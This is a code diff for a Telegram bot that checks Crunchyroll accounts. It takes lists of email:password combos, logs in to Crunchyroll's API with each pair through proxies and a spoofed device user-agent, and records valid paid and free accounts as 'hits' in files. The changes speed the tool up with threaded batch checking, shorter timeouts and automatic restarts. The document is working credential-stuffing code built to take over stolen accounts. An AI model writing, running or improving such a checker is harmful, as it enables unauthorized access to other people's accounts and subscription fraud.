@@ -5,11 +5,9 @@ import random
 import requests
 from aiogram import Bot, Dispatcher, types
 from aiogram.filters import Command
-from aiogram.types import FSInputFile
 from aiogram import F
 
 BOT_TOKEN = os.getenv("BOT_TOKEN")
-AUTHORIZED_USERS = []  # Allow everyone
 
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
@@ -95,7 +93,7 @@ class CrunchyrollChecker:
                 'device_name': 'Baron'
             }
 
-            response = session.post(url, headers=headers, data=data, timeout=15)
+            response = session.post(url, headers=headers, data=data, timeout=12)
             response_text = response.text
 
             if any(x in response_text for x in ["invalid_credentials", "force_password_reset", "too_many_requests", "401", "400", "missing_required_field"]):
@@ -111,12 +109,12 @@ class CrunchyrollChecker:
                 'user-agent': 'AppleCoreMedia/1.0.0.20L563 (Apple TV; U; CPU OS 16_5 like Mac OS X; en_us)'
             }
 
-            account_data = session.get('https://beta-api.crunchyroll.com/accounts/v1/me', headers=headers, timeout=15).json()
+            account_data = session.get('https://beta-api.crunchyroll.com/accounts/v1/me', headers=headers, timeout=12).json()
             email_verified = account_data.get('email_verified', False)
             created = account_data.get('created', '').split('T')[0]
             external_id = account_data.get('external_id')
 
-            products_data = session.get(f'https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/products', headers=headers, timeout=15).json()
+            products_data = session.get(f'https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/products', headers=headers, timeout=12).json()
 
             plan = "Free"
             currency = "N/A"
@@ -129,7 +127,7 @@ class CrunchyrollChecker:
                 subscribable = str(item.get('product', {}).get('is_subscribable', False))
                 free_trial = str(item.get('active_free_trial', False))
 
-            sub_data = session.get(f'https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}', headers=headers, timeout=15).json()
+            sub_data = session.get(f'https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}', headers=headers, timeout=12).json()
 
             expiry = sub_data.get('next_renewal_date', 'N/A')
             if expiry and 'T' in expiry:
@@ -192,12 +190,10 @@ CHECKED BY: @Cr_chker001_bot
         await bot.send_message(chat_id, f"<b>🎯 PREMIUM HIT</b>\n<pre>{capture}</pre>", parse_mode="HTML")
         with open("hits.txt", "a", encoding="utf-8") as f:
             f.write(capture + "\n")
-
     elif result['status'] == 'FREE':
         await bot.send_message(chat_id, f"<b>🆓 FREE HIT</b>\n<pre>{capture}</pre>", parse_mode="HTML")
-        with open("free.txt", "a", encoding="utf-8") as f:   # also saves free accounts
+        with open("free.txt", "a", encoding="utf-8") as f:
             f.write(capture + "\n")
-
     else:
         await bot.send_message(chat_id, f"❌ INVALID → {result['email']}")
 
@@ -226,7 +222,7 @@ async def proxies_cmd(message: types.Message):
 async def handle(message: types.Message):
     global checker
 
-    # Proxy loading - ONLY when /proxies command is used
+    # Proxy loading
     if message.text and message.text.startswith("/proxies"):
         if message.document:
             file = await bot.get_file(message.document.file_id)
@@ -261,34 +257,47 @@ async def handle(message: types.Message):
     if not lines:
         return await message.answer("No valid email:password found.")
 
-    await message.answer(f"🚀 Checking {len(lines)} combos... (fast mode)")
+    total = len(lines)
+    await message.answer(f"🚀 Checking {total} combos... (fast mode)")
 
-    for line in lines:
-        try:
-            email, password = line.split(":", 1)
-            result = checker.check(email.strip(), password.strip())
+    # Process in small batches to prevent freezing
+    for i in range(0, total, 4):  # 4 at a time
+        batch = lines[i:i+4]
+        for line in batch:
+            try:
+                email, password = line.split(":", 1)
+                # Run the blocking check in a separate thread
+                result = await asyncio.to_thread(checker.check, email.strip(), password.strip())
 
-            stats['checked'] += 1
-            if result['status'] == 'PREMIUM':
-                stats['premium'] += 1
-            elif result['status'] == 'FREE':
-                stats['free'] += 1
-            else:
-                stats['invalid'] += 1
+                stats['checked'] += 1
+                if result['status'] == 'PREMIUM':
+                    stats['premium'] += 1
+                elif result['status'] == 'FREE':
+                    stats['free'] += 1
+                else:
+                    stats['invalid'] += 1
 
-            await send_result(message.from_user.id, result)
+                await send_result(message.from_user.id, result)
 
-            await asyncio.sleep(1.0 + random.uniform(0.2, 0.6))
+            except Exception:
+                continue
 
-        except:
-            continue
+        await asyncio.sleep(1.2)  # Small delay between batches
+
+    await message.answer("✅ Finished checking all combos!")
 
 
 async def main():
     global checker
     checker = CrunchyrollChecker(proxies)
     print("✅ Bot started")
-    await dp.start_polling(bot)
+
+    while True:
+        try:
+            await dp.start_polling(bot, skip_updates=True)
+        except Exception as e:
+            print(f"Polling error: {e}. Restarting in 5 seconds...")
+            await asyncio.sleep(5)
 
 
 if __name__ == "__main__":
